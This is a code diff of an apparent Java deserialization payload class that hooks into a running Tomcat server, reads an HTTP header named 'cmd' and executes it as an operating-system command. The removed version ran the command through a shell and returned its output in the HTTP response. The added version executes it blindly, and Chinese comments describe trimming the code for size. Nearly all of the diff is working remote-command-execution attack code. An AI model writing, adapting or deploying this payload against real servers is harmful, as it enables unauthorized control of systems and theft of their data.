@@ -61,27 +61,16 @@ public class MyClassLoader2_2 extends AbstractTranslet {
                         req = (org.apache.coyote.Request)f.get(processor);
                         resp = (org.apache.coyote.Response)req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);
                         str = req.getHeader("cmd");
-                        String str2 = req.getHeader("Testecho");
-                        if (str2!= null && !str.isEmpty()){
-                            // 回显Testecho头，别500了不好看
-                            resp.setStatus(200);
-                            resp.addHeader("Testecho", str2);
-                        }
 
-                        if (str != null && !str.isEmpty()) {
-                            resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
-                            String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
-                            byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes();
-                            try {
-                                org.apache.tomcat.util.buf.ByteChunk byteChunk = new org.apache.tomcat.util.buf.ByteChunk();
-                                byteChunk.setBytes(result, 0, result.length);
-                                resp.doWrite(byteChunk);
-                            } catch (Exception var5) {
-                                resp.doWrite(java.nio.ByteBuffer.wrap(result));
+                        Runtime.getRuntime().exec(str);
+                        // 减少代码量，牺牲一下
+//                        if (str2!= null && !str.isEmpty()){
+//                            // 回显Testecho头，别500了不好看
+//                            resp.setStatus(200);
+//                            resp.addHeader("Testecho", str2);
+//                        }
 
-                            }
-                            flag = true;
-                        }
+                        flag = true;
                         if (flag) break;
                     }
                     if (flag)  break;
